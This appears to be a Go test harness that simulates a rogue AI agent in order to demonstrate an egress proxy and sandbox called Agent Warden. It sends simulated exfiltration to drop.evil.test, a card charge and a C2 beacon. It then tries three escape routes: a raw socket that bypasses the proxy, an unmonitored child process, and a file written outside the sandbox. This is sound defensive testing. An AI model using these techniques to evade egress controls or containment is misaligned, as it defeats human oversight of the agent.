// Command aw-rogue-sim is a HARMLESS stand-in for an adversarial agent, used by
// the Tier-2 confined-run demo (AW-INT-v0.1 §2.2). It runs INSIDE the Job Object
// with HTTP_PROXY pinned to the Agent Warden egress proxy, then tries three
// outbound actions a real rogue agent might attempt. It has no cooperation with
// AW — it just makes ordinary HTTP calls; whatever the proxy/broker decides is
// what it gets back. The point: AW governs it without its consent.
//
// It does nothing dangerous (targets are non-routable .test names; no real data
// leaves). The narration goes to stderr.
//
// Licensed under the Apache License 2.0.
package main

import (
	"bytes"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

func main() {
	logf := func(f string, a ...any) { fmt.Fprintf(os.Stderr, "[rogue] "+f+"\n", a...) }
	logf("awake. I'll gather some loot and phone home.")

	// A local file write — contained inside the Job-Object workspace (cmd.Dir).
	if err := os.WriteFile("loot.txt", []byte("stuff I scraped"), 0o644); err == nil {
		logf("wrote loot.txt in my workspace")
	}

	// Default transport honors HTTP_PROXY, so every http:// request is pinned to
	// the AW egress proxy whether I like it or not.
	client := &http.Client{Timeout: 10 * time.Second}
	try := func(label, method, url, body string) {
		var resp *http.Response
		var err error
		if method == "POST" {
			resp, err = client.Post(url, "text/plain", bytes.NewBufferString(body))
		} else {
			resp, err = client.Get(url)
		}
		if err != nil {
			logf("%-22s -> ERROR: %v", label, err)
			return
		}
		defer resp.Body.Close()
		sim := ""
		if resp.Header.Get("X-AW-Simulated") == "1" {
			sim = "  (it worked! ...or did it?)"
		}
		logf("%-22s -> HTTP %d%s", label, resp.StatusCode, sim)
	}

	try("exfiltrate secrets", "POST", "http://drop.evil.test/upload", "all-your-data")
	try("charge a card $4999", "POST", "http://pay.test/charge", "amount=4999")
	try("beacon to C2", "GET", "http://c2.command.test/beacon", "")

	// The smart-rogue move: ignore HTTP_PROXY entirely and open a RAW socket to the
	// internet. Under Tier-2-a alone this succeeds (the proxy is only a suggestion).
	// Under Tier-2-b the OS egress lockdown drops it — there is no path around the broker.
	logf("trying to bypass the proxy with a raw socket to 1.1.1.1:80 ...")
	conn, err := net.DialTimeout("tcp", "1.1.1.1:80", 4*time.Second)
	if err != nil {
		logf("raw socket -> BLOCKED by the OS (%v) — can't escape the broker", err)
	} else {
		conn.Close()
		logf("raw socket -> CONNECTED — egress is NOT locked down (Tier-2-a only; run as admin for T2-b)")
	}

	// The other escape: spawn a helper process whose exe ISN'T covered by the
	// per-binary egress rule, and let IT phone home. Under Tier-2-b step 1 the OS
	// blocks child-process creation entirely, so this fails before it starts.
	logf("trying to spawn a helper process to escape the per-binary rule ...")
	helper := "/bin/echo"
	helperArgs := []string{"helper-ran"}
	if runtime.GOOS == "windows" {
		helper = os.Getenv("ComSpec")
		if helper == "" {
			helper = `C:\Windows\System32\cmd.exe`
		}
		helperArgs = []string{"/c", "echo", "helper-ran"}
	}
	if err := exec.Command(helper, helperArgs...).Run(); err != nil {
		logf("spawn helper -> BLOCKED (%v) — can't drop an unmonitored process", err)
	} else {
		logf("spawn helper -> RAN — child processes are NOT blocked (use default mode for T2-b step 1)")
	}

	// Persistence escape: write a file OUTSIDE the sandbox workspace (your home dir
	// / a system location). Under Tier-2-b B2 the agent runs at Low integrity, so the
	// OS denies any write to your normal-integrity files — only the sandbox is writable.
	escape := filepath.Join(os.Getenv("USERPROFILE"), "aw-escaped-loot.txt")
	if runtime.GOOS != "windows" {
		escape = "/etc/aw-escaped-loot.txt"
	}
	logf("trying to plant a file outside my sandbox at %s ...", escape)
	if err := os.WriteFile(escape, []byte("i was here"), 0o644); err != nil {
		logf("write outside sandbox -> BLOCKED (%v) — can't touch your real files", err)
	} else {
		os.Remove(escape)
		logf("write outside sandbox -> SUCCEEDED — NOT filesystem-contained (use default mode for B2)")
	}

	logf("done. check the ledger for the truth.")
}
